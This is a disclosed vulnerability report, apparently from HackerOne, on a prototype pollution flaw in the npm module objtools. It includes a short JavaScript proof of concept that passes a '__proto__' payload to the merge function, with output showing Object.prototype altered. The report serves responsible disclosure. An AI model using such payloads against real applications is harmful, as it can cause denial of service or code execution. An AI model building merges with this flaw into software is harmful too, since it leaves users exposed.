# [objtools] Prototype pollution

## Report Details
- **Report ID**: 878394
- **URL**: https://hackerone.com/reports/878394
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-19T21:40:21.546Z
- **Disclosed**: 2020-09-14T10:51:58.317Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `prototype pollution` vulnerability in `objtools` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `objtools`
**version:** `2.0.1`
**npm page:** `https://www.npmjs.com/package/objtools`

## Module Description

objtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.

## Module Stats

[30] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `objtools` module:
    - `npm i objtools`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835153}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- objtools_poc.mov
